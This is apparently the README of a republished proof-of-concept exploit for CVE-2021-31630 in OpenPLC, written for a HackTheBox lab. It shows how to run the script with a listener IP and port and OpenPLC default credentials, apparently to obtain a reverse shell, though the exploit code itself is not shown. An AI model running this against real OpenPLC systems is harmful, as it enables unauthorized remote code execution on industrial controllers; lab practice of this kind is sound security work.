## CVE-2021-31630 Exploit
This PoC was originally developed by [Hunt3r0x](https://github.com/Hunt3r0x/CVE-2021-31630-HTB) but I found the political messages to be, quite unnecessary for a HackTheBox PoC so I republished it removing that as well as fixing some typos.

## Usage

```bash
python exploit.py -ip <IP_ADDRESS_FOR_LISTEN> -p <PORT_FOR_LISTEN> -u <USERNAME> -pwd <PASSWORD>
```
```bash
python ./exploit.py -ip 10.10.16.5 -p 1337 -u openplc -pwd openplc
```

### Arguments

- `-ip`  <IP_ADDRESS>: Specifies the IP address to listen on.
- `-p`   <PORT>: Specifies the port to listen on.
- `-u`   <USERNAME>: Specifies the username for OpenPLC login.
- `-pwd` <PASSWORD>: Specifies the password for OpenPLC login.
